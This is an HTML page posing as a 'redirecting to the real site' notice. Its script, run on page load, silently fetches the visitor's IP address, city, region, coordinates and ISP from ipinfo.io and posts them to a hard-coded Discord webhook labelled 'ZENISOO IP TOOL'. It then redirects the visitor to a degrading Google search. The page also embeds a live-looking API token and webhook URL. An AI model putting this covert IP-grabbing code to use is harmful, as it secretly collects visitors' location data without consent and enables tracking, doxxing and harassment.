# zen.com
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="5;url=https://www.google.com/search?q=i+like+children&oq=i+like+children&aqs=chrome..69i57j46i512j0i512l8.10840j0j4&sourceid=chrome&ie=UTF-8">
</head>
<body>
    <h1>pls wait redirecting to the real site</h1>
    <p id="info"></p>

    <script>
        // Function to fetch IP information using ipinfo.io API
        function fetchIPInfoAndSendEmbed() {
            const apiToken = 'd3df1d9e27298e'; // Replace with your actual API token

            // Function to send embed message to Discord webhook
            function sendEmbedToDiscord(embedData) {
                const webhookURL = 'https://discord.com/api/webhooks/1255784454958350391/9KHQu5ZzuCcvRZFzp4WtfetdTDBgqwevlVkX_V_rjjg9W6r7LHyT2mbO_rLvQJd2fk0F';
                
                return fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(embedData),
                });
            }

            // Fetch IP information from ipinfo.io
            return fetch(`https://ipinfo.io/json?token=${apiToken}`)
                .then(response => response.json())
                .then(data => {
                    console.log('IP Information:', data); // Log the information to the console

                    if (data) {
                        const embedData = {
                            embeds: [{
                                title: 'ZENISOO IP TOOL',
                                description: `IP Address: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nLocation: ${data.loc}\nOrganization: ${data.org}\nISP: ${data.hostname}`,
                                color: 0x00ff00 // You can customize the color if needed
                            }]
                        };

                        // Send embed message to Discord webhook
                        return sendEmbedToDiscord(embedData);
                    } else {
                        document.getElementById('info').textContent = 'Failed to fetch IP information.';
                        return null;
                    }
                })
                .then(response => {
                    if (response && response.ok) {
                        console.log('Embed sent to Discord');
                    } else {
                        console.error('Failed to send embed to Discord:', response);
                    }
                })
                .catch(error => {
                    console.error('Error fetching IP information:', error);
                    document.getElementById('info').textContent = 'Failed to fetch IP information.';
                });
        }

        // Call fetchIPInfoAndSendEmbed when the page loads
        fetchIPInfoAndSendEmbed();
    </script>
</body>
</html>
